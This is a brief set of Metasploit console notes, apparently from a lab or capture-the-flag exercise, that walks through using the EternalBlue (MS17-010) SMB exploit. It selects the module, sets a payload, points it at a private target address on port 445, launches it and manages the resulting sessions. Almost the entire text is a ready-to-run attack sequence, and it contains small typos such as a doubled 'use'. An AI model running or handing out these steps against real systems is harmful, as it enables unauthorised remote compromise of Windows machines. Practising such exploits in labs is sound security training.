# select eploit

use use exploit/windows/smb/ms17_010_eternalblue
show payloads
set payload 2

# set options

show options
set rhosts 10.201.63.250
set rport 445

# exploit

exploit

# background

CTRL+Z

# reconnect session

sessions
sessions -h
sessions -i 1
